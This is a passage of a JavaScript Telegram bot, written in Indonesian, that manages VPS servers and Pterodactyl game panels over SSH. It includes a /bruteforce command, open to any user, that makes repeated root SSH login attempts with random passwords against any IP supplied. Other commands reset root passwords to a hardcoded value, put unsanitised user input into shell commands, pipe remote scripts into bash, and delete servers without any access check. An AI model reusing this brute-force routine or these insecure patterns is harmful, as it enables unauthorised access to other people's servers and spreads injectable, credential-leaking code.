┣━━━━━━━━━━━━━━━━━━⬣
┃ ✧ RAM Terpakai: ${usedRAM}
┃ ✧ RAM Tersisa : ${freeRAM}
┗━━━━━━━━━━━━━━━━━━⬣
</b></blockquote>`;

      replyMarkup = { inline_keyboard: [[{ text: "𝗕𝗔𝗖𝗞", callback_data: "back_to_main" }]] };
      }

    if (query.data === "back_to_main") {
      caption = `<blockquote><b>
┏━⬣ ✧「 INFORMASI 」✧
┃ 𒆜 Developer : @RanzOfficiallz
┃ 𒆜 BotName : 𝙍𝙖𝙣𝙯 𝙄𝙣𝙨𝙩𝙖𝙡𝙡 × 𝙉𝙤𝙙𝙚 
┃ 𒆜 Version : 6.0
┃ 𒆜 League : JavaScript
┗━━━━━━━━━━━━━━━━━━⬣
┏━⬣ ✧「 STATUS 」✧
┃ ✧ UserName : ${username}
┃ ✧ Runtime : ${runtime}
┃ ✧ Premium : ${premiumStatus}
┃ ✧ Tanggal : ${dragonTimeDate}
┃ ✧ UserId : ${senderId}
┗━━━━━━━━━━━━━━━━━━⬣</b></blockquote>`;
      replyMarkup = {
        inline_keyboard: [
        [
          { text: "𝗦𝗧𝗔𝗧𝗨𝗦 𝗩𝗣𝗦", callback_data: "ping" }
        ],
        [
          { text: "𝗠𝗘𝗡𝗨 𝗔𝗞𝗦𝗘𝗦", callback_data: "akses" }, 
          { text: "𝗠𝗘𝗡𝗨 𝗖𝗣𝗔𝗡𝗘𝗟", callback_data: "Cpanel" }
        ],
        [
          { text: "𝗣𝗥𝗢𝗧𝗘𝗖𝗧 𝗣𝗔𝗡𝗘𝗟", callback_data: "protect" },
          { text: "𝗠𝗘𝗡𝗨 𝗜𝗡𝗦𝗧𝗔𝗟𝗔𝗦𝗜", callback_data: "install" }
        ],
        [
         { text: "𝗧𝗤", callback_data: "support" }
        ]
        ]
      };
    }

    await bot.editMessageMedia(
      {
        type: "photo",
        media: randomImage,
        caption: caption,
        parse_mode: "HTML"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});

bot.onText(/^\/bruteforce(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Format salah!\nContoh:\n/bruteforce 123.44.33.22,10,10 ( MAX 100x )"
    );
  }

  let [ip, lenStr, tryStr] = match[1].split(",");
  const length = parseInt(lenStr, 10);
  let userTry = parseInt(tryStr, 10);

  if (!ip || !length || length < 4 || length > 16) {
    return bot.sendMessage(chatId, "❌ IP atau panjang password tidak valid");
  }

  const MAX_TRY = 100;
  let notice = "";

  if (!userTry || userTry < 1) {
    userTry = 1;
  } else if (userTry > MAX_TRY) {
    notice =
      "⚠️ Percobaan dibatasi maksimal *100x*. Permintaan kamu disesuaikan otomatis.\n\n";
    userTry = MAX_TRY;
  }

  let attempts = 0;
  const triedPasswords = [];
  
  const sent = await bot.sendMessage(
    chatId,
    notice + "⏳ Permintaan Brute Force 0"
  );

  const tryLogin = () => {
    if (attempts >= userTry) {
      const list = triedPasswords
        .map((p, i) => `${i + 1}. ${p}`)
        .join("\n");

      return bot.editMessageText(
`❌ *LOGIN GAGAL*
IPVPS   : \`${ip}\`
PASSWORD:
${list}
PERCOBAAN: ${attempts}x
CATATAN: BRUTE FORCE DAPAT MENYEBABKAN DELAY DAN MENINGKATKAN PENGGUNAAN RAM IPVPS.`,
        {
          chat_id: chatId,
          message_id: sent.message_id,
          parse_mode: "Markdown",
        }
      );
    }
    attempts++;
    bot.editMessageText(
      `⏳ Permintaan Brute Force ${attempts}`,
      {
        chat_id: chatId,
        message_id: sent.message_id,
      }
    );

    const password = genRandomPass(length);
    triedPasswords.push(password);

    const conn = new Client();
    let done = false;

    conn.on("ready", () => {
      done = true;
      conn.end();
      bot.editMessageText(
`✅ *LOGIN BERHASIL*
IPVPS     : \`${ip}\`
PASSWORD  : \`${password}\`
PERCOBAAN : ${attempts}x
CATATAN: ANJAY HOKY DAPET PASSWORD BENER GACOR.`,
        {
          chat_id: chatId,
          message_id: sent.message_id,
          parse_mode: "Markdown",
        }
      );
    });
    
    conn.on("error", () => {
      if (done) return;
      conn.end();
      setTimeout(tryLogin, 1000);
    });

    conn.connect({
      host: ip.trim(),
      port: 22,
      username: "root",
      password,
      readyTimeout: 8000,
    });
  };

  tryLogin();
});

bot.onText(/^\/cekip(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  let target = match[1]?.trim();

  if (!target) {
    return bot.sendMessage(
      chatId,
      "❌ Format salah!\nContoh:\n/cekip google.com\n/cekip https://google.com"
    );
  }
  
  try {
    if (!target.startsWith("http://") && !target.startsWith("https://")) {
      target = "http://" + target;
    }
    target = new URL(target).hostname;
  } catch (e) {
    return bot.sendMessage(chatId, "❌ URL tidak valid");
  }

  const sent = await bot.sendMessage(chatId, "⏳ Proses cek IPVPS...");

  dns.lookup(target, (err, address) => {
    if (err) {
      return bot.editMessageText(
`❌ *GAGAL CEK IP*
TARGET : \`${target}\`
INFO   : Tidak dapat resolve IP`,
        {
          chat_id: chatId,
          message_id: sent.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    bot.editMessageText(
`✅ *HASIL CEK IP*
DOMAIN : \`${target}\`
IPVPS  : \`${address}\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown",
      }
    );
  });
});


bot.onText(/^\/hostname(?:\s+(\S+)\s+(\S+)\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;

  // Kalau format salah
  if (!match[1] || !match[2] || !match[3]) {
    return bot.sendMessage(
      chatId,
      "❌ Format salah!\nGunakan:\n/hostname ipvps password hostname-baru"
    );
  }

  const ipVps = match[1];
  const password = match[2];
  const newHostname = match[3].trim();

  const ssh = new NodeSSH();

  try {
    // Pesan loading
    const sent = await bot.sendMessage(chatId, "🔄 Mengganti hostname...");

    // LOGIN SSH (REAL-TIME)
    await ssh.connect({
      host: ipVps,
      username: "root",
      password: password,
      readyTimeout: 15000
    });

    // Ambil hostname lama
    const oldHost = await ssh.execCommand("hostname");
    const oldHostname = oldHost.stdout.trim();

    // Ganti hostname
    await ssh.execCommand(`hostnamectl set-hostname ${newHostname}`);

    // Update hosts
    await ssh.execCommand(
      `sed -i "s/^127.0.1.1.*/127.0.1.1 ${newHostname}/" /etc/hosts`
    );

    // Edit pesan hasil
    await bot.editMessageText(
`🔄 Mengganti hostname...
🎯 Berhasil mengganti hostname
🖥️ Hostname lama: ${oldHostname}
🚀 Hostname baru: ${newHostname}`,
      {
        chat_id: chatId,
        message_id: sent.message_id
      }
    );

    ssh.dispose();
  } catch (err) {
    bot.sendMessage(
      chatId,
      "❌ Gagal mengganti hostname\n" + err.message
    );
  }
});

const NEW_PASSWORD = "pirzy";

function isIP(text) {
  return /^(\d{1,3}\.){3}\d{1,3}$/.test(text);
}

bot.onText(/^\/change(?:\s+(.*))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = (match[1] || "").trim();

  // ❌ jika hanya /change
  if (!input) {
    return bot.sendMessage(
      chatId,
      "❌ Format salah\n\nGunakan:\n/change IP PASSWORD\n/change PASSWORD IP"
    );
  }

  const args = input.split(/\s+/);
  if (args.length < 2) {
    return bot.sendMessage(
      chatId,
      "❌ Format salah\n\nGunakan:\n/change IP PASSWORD\n/change PASSWORD IP"
    );
  }

  let ip, oldPassword;

  if (isIP(args[0])) {
    ip = args[0];
    oldPassword = args[1];
  } else if (isIP(args[1])) {
    ip = args[1];
    oldPassword = args[0];
  } else {
    return bot.sendMessage(chatId, "❌ IP VPS tidak valid");
  }

  const prosesMsg = await bot.sendMessage(
    chatId,
    "🔄 Menghubungkan ke VPS...\n⏳ Mohon tunggu"
  );

  const ssh = new NodeSSH();

  try {
    await ssh.connect({
      host: ip,
      username: "root",
      password: oldPassword,
      port: 22,
      readyTimeout: 20000
    });

    await bot.editMessageText(
      "🔐 Login berhasil\n⚙️ Mengganti password...",
      {
        chat_id: chatId,
        message_id: prosesMsg.message_id
      }
    );

    const exec = await ssh.execCommand(
      `echo "root:${NEW_PASSWORD}" | chpasswd`
    );

    if (exec.stderr) throw exec.stderr;

    await bot.editMessageText(
      `✅ PASSWORD VPS BERHASIL DIGANTI\n\n` +
      `Ipvps: ${ip}\n` +
      `Password lama: ${oldPassword}\n` +
      `Password baru: ${NEW_PASSWORD}`,
      {
        chat_id: chatId,
        message_id: prosesMsg.message_id
      }
    );

    ssh.dispose();
  } catch (err) {
    await bot.editMessageText(
      "❌ Gagal ganti password VPS\nPastikan IP & password lama benar",
      {
        chat_id: chatId,
        message_id: prosesMsg.message_id
      }
    );
  }
});

//INSTALL PANEL MENU
bot.onText(/^\/uninstalltema(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = (match[1] || "").trim();

  if (!input || !input.includes("|")) {
    return bot.sendMessage(
      chatId,
      "❌ *FORMAT SALAH*\n\n" +
      "Gunakan:\n" +
      "`/uninstalltema IP|PASSWORD`\n\n" +
      "Contoh:\n" +
      "`/uninstalltema 1.2.3.4|password`",
      { parse_mode: "Markdown" }
    );
  }

  let [ip, pw] = input.split("|").map(v => v.trim());
  let port = 22;

  if (ip.includes(":")) {
    const p = ip.split(":");
    ip = p[0];
    port = parseInt(p[1]) || 22;
  }

  bot.sendMessage(
    chatId,
    "⏳ *UNINSTALL TEMA PANEL*\n\n" +
    `Server: \`${ip}:${port}\`\n\n` +
    "Proses berjalan, mohon tunggu...",
    { parse_mode: "Markdown" }
  );

  const ssh = new Client();
  let done = false;

  ssh.on("ready", () => {
    ssh.exec(
      "bash <(curl -s https://raw.githubusercontent.com/Zero-Hiroo/Autoinstall-/refs/heads/main/bangkai.sh)",
      (err, stream) => {
        if (err) return gagal();
        stream.write("2\n");
        stream.write("y\n");
        stream.write("y\n");
        setTimeout(() => {
          if (done) return;
          done = true;

          bot.sendMessage(
            chatId,
            "✅ *UNINSTALL SELESAI*\n\n" +
            "Tema panel berhasil dihapus.\n" +
            "Silakan refresh panel.",
            { parse_mode: "Markdown" }
          );

          try { stream.end(); } catch {}
          ssh.end();
        }, 10000);
      }
    );
  });

  ssh.on("error", gagal);

  ssh.connect({
    host: ip,
    port: port,
    username: "root",
    password: pw,
    readyTimeout: 10000
  });

  function gagal() {
    if (done) return;
    done = true;

    bot.sendMessage(
      chatId,
      "❌ *UNINSTALL GAGAL*\n\n" +
      "Periksa IP / Password / Port VPS.",
      { parse_mode: "Markdown" }
    );

    ssh.end();
  }
});

bot.onText(/\/installpanel(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const text = match[1];
  const userId = msg.from.id.toString();
  
  
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan admin.");
  }

  if (!text) {
    return bot.sendMessage(chatId, `❗ *FORMAT SALAH*

Gunakan format:
\`/installpanel ipvps|password|domainpnl|domainnode|ramvps\`

📌 Contoh:
\`/installpanel 1.1.1.1|password123|panel.domain.com|node.domain.com|8000\`
➡️ Contoh ramvps:
• 40000 = 4GB
• 80000 = 8GB
• 160000 = 16GB
`, { parse_mode: "Markdown" });
  }

  const t = text.split('|');
  if (t.length < 5) {
    return bot.sendMessage(chatId, `❗ *FORMAT SALAH*

Gunakan format:
\`/installpanel ipvps,|password|domainpnl|domainnode|ramvps\`

📌 Contoh:
\`/installpanel 1.1.1.1|password123|panel.domain.com|node.domain.com|8000\`
➡️ Contoh ramvps:
• 40000 = 4GB
• 80000 = 8GB
• 160000 = 16GB
`, { parse_mode: "Markdown" });
  }

  const [ipvps, passwd, subdomain, domainnode, ramvps] = t;
  const connSettings = { host: ipvps, port: 22, username: "root", password: passwd };
  const password = 'admin';
  const command = 'bash <(curl -s https://pterodactyl-installer.se)';
  const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
  const conn = new Client();

  let lastMsgId = null; 

  conn.on('ready', async () => {
    if (lastMsgId) await bot.deleteMessage(chatId, lastMsgId).catch(() => {});
    const msg1 = await bot.sendMessage(chatId, `🚀 PROSES INSTALL PANEL SEDANG BERLANGSUNG, MOHON TUNGGU 5-10 MENIT`);
    lastMsgId = msg1.message_id;

    conn.exec(command, (err, stream) => {
      if (err) throw err;

      stream.on('close', async (code, signal) => {
        console.log(`Panel install stream closed: ${code}, ${signal}`);
        await bot.deleteMessage(chatId, lastMsgId).catch(() => {});
        const msg2 = await bot.sendMessage(chatId, `🛠️ PROSES INSTALL WINGS, MOHON TUNGGU 5 MENIT`);
        lastMsgId = msg2.message_id;

        installWings(conn);
      }).on('data', (data) => {
        handlePanelInstallationInput(data, stream, subdomain, password);
      }).stderr.on('data', (data) => console.log('STDERR:', data.toString()));
    });
  }).connect(connSettings);

  function installWings(conn) {
    conn.exec(commandWings, (err, stream) => {
      if (err) throw err;

      stream.on('close', async (code, signal) => {
        console.log(`Wings install stream closed: ${code}, ${signal}`);
        await bot.deleteMessage(chatId, lastMsgId).catch(() => {});
        const msg3 = await bot.sendMessage(chatId, `📡 MEMULAI CREATE NODE & LOCATION`);
        lastMsgId = msg3.message_id;

        createNode(conn);
      }).on('data', (data) => {
        handleWingsInstallationInput(data, stream, domainnode, subdomain);
      }).stderr.on('data', (data) => console.log('STDERR:', data.toString()));
    });
  }

  function createNode(conn) {
  const command = `${config.bash}`;
  conn.exec(command, (err, stream) => {
    if (err) throw err;

    stream.on('close', async () => {
      await bot.deleteMessage(chatId, lastMsgId).catch(() => {});
      const msg4 = await bot.sendMessage(chatId, `⚙️ GENERATE CONFIG & START WINGS`);
      lastMsgId = msg4.message_id;
      
      const cmdCfg = `
        cd /var/www/pterodactyl && php artisan p:node:configuration 1 > /etc/pterodactyl/config.yml && chmod 600 /etc/pterodactyl/config.yml && systemctl restart wings
      `;

      conn.exec(cmdCfg, async (err3, stream2) => {
        if (err3) {
          await bot.deleteMessage(chatId, lastMsgId).catch(() => {});
          return bot.sendMessage(chatId, `❌ Gagal generate config / start wings:\n${err3.message}`);
        }

        stream2.on("exit", async () => {
          await bot.deleteMessage(chatId, lastMsgId).catch(() => {});
          sendPanelData();
          conn.end();
        });
      });
    }).on('data', (data) => {
      handleNodeCreationInput(data, stream, domainnode, ramvps);
    }).stderr.on('data', (data) => {
      console.log('Node STDERR:', data.toString());
    });
  });
}

  function sendPanelData() {
  bot.sendMessage(chatId, `
<b>Install Panel Selesai Berikut Data Anda</b>

<b>Data Vps Anda</b>
🌐 Ip Vps: <code>${ipvps}</code>
🔐 Password: <code>${passwd}</code>

<b>📦 Berikut Detail Akun Panel Kamu:</b>

👤 <b>Username:</b> <code>admin</code>
🔐 <b>Password:</b> <code>${password}</code>
🌐 <b>Domain:</b> ${subdomain}

━━━━━━━━━━━━━━━━━━━━━━━
<blockquote>Jangan Lupa Untuk berlangganan 😁</blockquote>
━━━━━━━━━━━━━━━━━━━━━━━
`, { parse_mode: "HTML" });
}

  // ========== HANDLER INTERAKSI SHELL ==========
  function handlePanelInstallationInput(data, stream, subdomain, password) {
    const str = data.toString();
    if (str.includes('Input')) {
      stream.write('0\n\n\n1248\nAsia/Jakarta\nadmin@gmail.com\nadmin@gmail.com\nadmin\nadmin\nadmin\n');
      stream.write(`${password}\n`);
      stream.write(`${subdomain}\n`);
      stream.write('y\ny\ny\ny\ny\n\n1\n');
    }
    if (str.includes("Select the appropriate number")) stream.write("1\n");
    if (str.includes("Still assume SSL")) stream.write("y\n");
    if (str.includes('Please read the Terms of Service')) stream.write('y\n');
    console.log('Panel STDOUT:', str);
  }

  function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
    const str = data.toString();
    if (str.includes('Input')) {
      stream.write('1\ny\ny\ny\n');
      stream.write(`${subdomain}\n`);
      stream.write('y\nuser\n1248\ny\n');
      stream.write(`${domainnode}\n`);
      stream.write('y\nadmin@gmail.com\ny\n');
    }
    if (str.includes("automatically configure HTTPS using Let's Encrypt")) {
  stream.write("y\n");
  }
    console.log('Wings STDOUT:', str);
  }

  function handleNodeCreationInput(data, stream, domainnode, ramvps) {
    stream.write(`${config.tokeninstall}\n4\nSGP\nJangan Lupa Support @Pirzyy1\n`);
    stream.write(`${domainnode}\nNODES\n${ramvps}\n${ramvps}\n1\n`);
    console.log('Node STDOUT:', data.toString());
  }
});

bot.onText(/^\/uninstallpanel(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];
  const senderId = msg.from.id;
  const userId = msg.from.id.toString();
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan admin.");
  }
  if (!text) {
    return bot.sendMessage(chatId, "❌ Format salah!\nContoh: /uninstallpanel ip|password");
  }
   
  const [ip, password] = text.split("|");
  if (!ip || !password) {
    return bot.sendMessage(chatId, "❌ Format salah!\nContoh: /uninstallpanel ip|password", { parse_mode: "Markdown" });
  }

  const conn = new Client();
  const random = Math.floor(1000 + Math.random() * 9000);

  bot.sendMessage(chatId, `
📡 ᴍᴇɴɢʜᴜʙᴜɴɢᴋᴀɴ ᴋᴇ ᴠᴘꜱ *${ip}*
ꜱɪʟᴀʜᴋᴀɴ ᴛᴜɴɢɢᴜ 10-20 ᴍᴇɴɪᴛ...`, { parse_mode: "Markdown" });

  conn.on("ready", () => {
    conn.exec("bash <(curl -s https://pterodactyl-installer.se)", (err, stream) => {
      if (err) {
        conn.end();
        return bot.sendMessage(chatId, "❌ Gagal menjalankan installer.");
      }

      stream.on("close", (code) => {
        conn.end();
        if (code === 0) {
          bot.sendMessage(chatId, `
✅ *ꜱᴜᴋꜱᴇꜱ ᴜɴɪɴꜱᴛᴀʟʟ ᴘᴀɴᴇʟ!*
`, { parse_mode: "Markdown" });
        } else {
          bot.sendMessage(chatId, `⚠️ ɪɴꜱᴛᴀʟʟᴇʀ ꜱᴇʟᴇꜱᴀɪ ᴅᴇɴɢᴀɴ ᴋᴏᴅᴇ ${code}. ʙᴇʙᴇʀᴀᴘᴀ ᴍᴜɴɢᴋɪɴ ɢᴀɢᴀʟ. ᴄᴇᴋ ᴍᴀɴᴜᴀʟ ᴠᴘꜱ.`);
        }
      });

      stream.on("data", (data) => {
        const out = data.toString();
        console.log("INSTALL >>", out);

        if (out.includes("Input 0-6")) stream.write("6\n");
        if (out.includes("Do you want to remove panel? (y/N)")) stream.write("y\n");
        if (out.includes("Do you want to remove Wings (daemon)? (y/N)")) stream.write("y\n");
        if (out.includes("Continue with uninstallation? (y/N)")) stream.write("y\n");
        if (out.includes("Choose the panel database (to skip don't input anything)")) stream.write("\n");
        if (out.includes("Database called panel has been detected. Is it the pterodactyl database? (y/N)")) stream.write("y\n");
        if (out.includes("User called pterodactyl has been detected. Is it the pterodactyl user? (y/N)")) stream.write("y\n");
      });

      stream.stderr.on("data", (data) => {
        console.error("STDERR:", data.toString());
      });
    });
  }).on("error", (err) => {
    bot.sendMessage(chatId, `❌ Gagal konek ke VPS:\n${err.message}`);
  }).connect({
    host: ip,
    port: 22,
    username: "root",
    password: password,
    readyTimeout: 20000
  });
});

bot.onText(/^(\.|\#|\/)swings(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const text = match[2];
  const senderId = msg.from.id;
  const reply = msg.reply_to_message;

  // ===============================
  // 🔐 VALIDASI OWNER ONLY
  // ===============================
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan admin.");
  }

  // ===============================
  // 📖 TUTORIAL JIKA TANPA ARGUMEN
  // ===============================
  if (!text) {
    return bot.sendMessage(chatId, `
📖 *TUTORIAL START WINGS* 📖

Gunakan format:
/swings ipvps|password|token

🔧 Contoh:
/swings 123.45.67.89|mypassword|token-xyz-123456
`, {
      parse_mode: "Markdown",
      reply_to_message_id: msg.message_id
    });
  }

  // ===============================
  // ❌ VALIDASI FORMAT
  // ===============================
  const t = text.split("|");
  if (t.length < 3) {
    return bot.sendMessage(
      chatId,
      `❌ *Format salah!*\n\nGunakan format:\n/swings ipvps|password|token`,
      { parse_mode: "Markdown" }
    );
  }

  const ipvps = t[0].trim();
  const passwd = t[1].trim();
  const token = t[2].trim();

  // ===============================
  // 🔑 KONFIGURASI SSH
  // ===============================
  const connSettings = {
    host: ipvps,
    port: 22,
    username: "root",
    password: passwd
  };

  const conn = new Client();

  // ===============================
  // 🔌 KONEKSI VPS
  // ===============================
  conn.on("ready", () => {
    bot.sendMessage(chatId, "⚙️ *PROSES CONFIGURE WINGS...*", {
      parse_mode: "Markdown"
    });

    conn.exec(`${config.bash}`, (err, stream) => {
      if (err) {
        bot.sendMessage(chatId, "❌ Terjadi error saat eksekusi command.");
        return conn.end();
      }

      stream.on("close", (code, signal) => {
        console.log("Stream closed:", code, signal);
        bot.sendMessage(
          chatId,
          "✅ *SUCCESS START WINGS!*\n⚡ Silakan cek node anda 😁",
          { parse_mode: "Markdown" }
        );
        conn.end();
      });

      stream.on("data", (data) => {
        console.log("STDOUT:", data.toString());
        stream.write(`${config.tokeninstall}\n`);
        stream.write("3\n");
        stream.write(`${token}\n`);
      });

      stream.stderr.on("data", (data) => {
        console.log("STDERR:", data.toString());
      });
    });
  });

  conn.on("error", (err) => {
    console.log("Connection Error:", err);
    bot.sendMessage(chatId, "❌ IP VPS atau password tidak valid!");
  });

  conn.connect(connSettings);
});

// CEK IP VPS;

bot.onText(/^\/cekipvps(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const ip = match[1]?.trim();

  // ❌ VALIDASI ADMIN
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses ditolak, kamu bukan admin.");
  }

  if (!ip) {
    return bot.sendMessage(
      chatId,
      "❌ Format salah!\nContoh:\n/cekipvps 123.44.33.22"
    );
  }

  const ipv4Regex =
    /^(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}$/;
  if (!ipv4Regex.test(ip)) {
    return bot.sendMessage(chatId, "❌ IP VPS tidak valid");
  }

  // Kirim pesan proses
  let sent;
  try {
    sent = await bot.sendMessage(chatId, "⏳ Proses cek IPVPS...");
  } catch {
    return;
  }

  // Pilih command ping sesuai OS
  const pingCmd =
    process.platform === "win32" ? `ping -n 1 ${ip}` : `ping -c 1 -W 3 ${ip}`;

  exec(pingCmd, async (error, stdout, stderr) => {
    let status = "TIME OUT";
    let pingTime = "-";

    // Debug log (opsional)
    console.log("stdout:", stdout);
    console.log("stderr:", stderr);
    console.log("error:", error);

    if (!error) {
      // Cek output ping
      const matchPing = stdout.match(/time[=<]([\d.]+)\s*ms/i);
      if (matchPing) {
        status = "AKTIF";
        pingTime = `${matchPing[1]} ms`;
      }
    }

    // Fallback: cek port SSH 22 jika ping gagal
    if (status !== "AKTIF") {
      const socket = new net.Socket();
      let sshAlive = false;

      socket.setTimeout(3000); // timeout 3 detik
      socket.on("connect", () => {
        sshAlive = true;
        socket.destroy();
      });
      socket.on("timeout", () => socket.destroy());
      socket.on("error", () => {});

      socket.connect(22, ip, () => {});

      await new Promise((resolve) => setTimeout(resolve, 3500)); // tunggu koneksi

      if (sshAlive) {
        status = "AKTIF (SSH OK)";
        pingTime = "-";
      }
    }

    const resultText = `
📡 *STATUS IPVPS*

IPVPS  : \`${ip}\`
STATUS : *${status}*
PING   : ${pingTime}
`;

    // Kirim hasil
    bot.editMessageText(resultText, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
    });
  });
});
// LOGIN VPS
const loginState = {};

bot.onText(/^\/loginvps(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const ip = match[1]?.trim();
  
  //VALIDASI KHUSUS ADMIN
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan admin.");
  }

  if (!ip) {
    return bot.sendMessage(
      chatId,
      "❌ Format salah!\nContoh:\n/loginvps 123.44.33.22"
    );
  }

  loginState[userId] = {
    ip,
    step: "WAIT_PASSWORD",
  };

  const sent = await bot.sendMessage(chatId, "🔐 Masukkan password VPS:");
  loginState[userId].replyTo = sent.message_id;
});

// handler reply password
bot.on("message", async (msg) => {
  const userId = msg.from?.id;
  const chatId = msg.chat?.id;

  if (!loginState[userId]) return;
  if (!msg.reply_to_message) return;

  const state = loginState[userId];

  if (msg.reply_to_message.message_id !== state.replyTo) return;
  if (!msg.text) return;

  const password = msg.text.trim();

  const conn = new Client();

  conn.on("ready", () => {
    conn.end();
    delete loginState[userId];
    bot.sendMessage(chatId, "✅ Password benar");
  });

  conn.on("error", () => {
    bot.sendMessage(chatId, "❌ Password salah, silakan coba lagi");
  });

  conn.connect({
    host: state.ip,
    port: 22,
    username: "root",
    password,
    readyTimeout: 10000,
  });
});

bot.onText(/\/ulang(?:\s+(.*))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const usernameInput = match[1]?.trim();

  if (!usernameInput) {
    return bot.sendMessage(
      chatId,
      `Ciri-Ciri Orang Pikun.\n\n` +
      `<b>Command ini Khusus Penggunaan Orang Pikun</b>\n` +
      `Contoh:\n<code>/ulang nama</code>`,
      { parse_mode: "HTML" }
    );
  }

  const panelData = readPanelData();
  const data = panelData[usernameInput];

  if (!data) {
    return bot.sendMessage(
      chatId,
      `❌ Data panel untuk username <b>${usernameInput}</b> tidak ditemukan atau sudah di-claim.`,
      { parse_mode: "HTML" }
    );
  }

  const pesan = `
┏━⬣ ✧「 DATA PANEL 」✧
┃ 好 Username : ${data.username}
┃ 好 Password : ${data.password}
┃ 好 Login    : ${data.domain}
┃ NOTE:
┃ Lain Kali Jangan Lupa /start Bot Dulu
┗━━━━━━━━━━━━━━━━━━⬣
`;

  try {
    await bot.sendMessage(msg.from.id, pesan, { parse_mode: "HTML" });

    delete panelData[usernameInput];
    savePanelData(panelData);

    await bot.sendMessage(
      chatId,
      "✅ Data panel sudah dikirim ke PM."
    );
  } catch (err) {
    await bot.sendMessage(
      chatId,
      "⚠️ Gagal mengirim data panel. Pastikan kamu sudah /start bot."
    );
  }
});

bot.onText(/^\/delsrvoff$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    // Ambil semua server
    const res = await fetch(`${domain}/api/application/servers?per_page=100`, {
      headers: {
        Accept: "application/json",
        Authorization: `Bearer ${plta}`,
      },
    });
    const data = await res.json();

    if (!data.data || data.data.length === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada server di panel.");
    }

    let offlineServers = [];

    for (let srv of data.data) {
      const uuid = srv.attributes.uuid;

      const st = await fetch(`${domain}/api/client/servers/${uuid}/resources`, {
        headers: {
          Accept: "application/json",
          Authorization: `Bearer ${pltc}`,
        },
      });

      const sd = await st.json();

      if (sd.attributes.current_state === "offline") {
        offlineServers.push({ id: srv.attributes.id, name: srv.attributes.name });
      }
    }

    if (offlineServers.length === 0) {
      return bot.sendMessage(chatId, "✅ Semua server dalam keadaan ONLINE.");
    }

    // Kirim pesan awal
    let sentMsg = await bot.sendMessage(chatId, "PROSES DEL SRV OFF");

    let successList = [];

    for (let srv of offlineServers) {
      // Hapus server
      await fetch(`${domain}/api/application/servers/${srv.id}`, {
        method: "DELETE",
        headers: {
          Accept: "application/json",
          Authorization: `Bearer ${plta}`,
        },
      });

      successList.push(`${srv.name} || ${srv.id}`);

      await bot.editMessageText(
        `SERVER\nNama: ${srv.name}\nID: ${srv.id}\nTELAH DI HAPUS`,
        { chat_id: chatId, message_id: sentMsg.message_id }
      );

   
      await new Promise(res => setTimeout(res, 2000));
    }

    let finalText = "SUKSES MENGHAPUS\n" + successList.map((s, i) => `${i+1}. ${s}`).join("\n");

    await bot.editMessageText(finalText, { chat_id: chatId, message_id: sentMsg.message_id });

  } catch (e) {
    bot.sendMessage(chatId, `❌ Error: ${e.message}`);
  }
});

bot.onText(/^\/delsrvoffv2$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const res = await fetch(`${domainv2}/api/application/servers?per_page=100`, {
      headers: {
        Accept: "application/json",
        Authorization: `Bearer ${pltav2}`,
      },
    });

    const data = await res.json();
    if (!data.data?.length) {
      return bot.sendMessage(chatId, "❌ Tidak ada server di panel.");
    }

    const offlineServers = [];

    for (const srv of data.data) {
      const uuid = srv.attributes.uuid;

      const st = await fetch(`${domainv2}/api/client/servers/${uuid}/resources`, {
        headers: {
          Accept: "application/json",
          Authorization: `Bearer ${pltcv2}`,
        },
      });

      const sd = await st.json();
      if (sd.attributes?.current_state === "offline") {
        offlineServers.push({
          id: srv.attributes.id,
          name: srv.attributes.name
        });
      }
    }

    if (!offlineServers.length) {
      return bot.sendMessage(chatId, "✅ Semua server dalam keadaan ONLINE.");
    }

    const sentMsg = await bot.sendMessage(chatId, "⏳ PROSES HAPUS SERVER OFFLINE...");
    const successList = [];

    for (const srv of offlineServers) {
      const del = await fetch(`${domainv2}/api/application/servers/${srv.id}`, {
        method: "DELETE",
        headers: {
          Accept: "application/json",
          Authorization: `Bearer ${pltav2}`,
        },
      });

      if (del.ok) {
        successList.push(`${srv.name} || ${srv.id}`);

        await bot.editMessageText(
          `🗑️ SERVER DIHAPUS\nNama: ${srv.name}\nID: ${srv.id}`,
          { chat_id: chatId, message_id: sentMsg.message_id }
        );

        await new Promise(r => setTimeout(r, 2000));
      }
    }

    await bot.editMessageText(
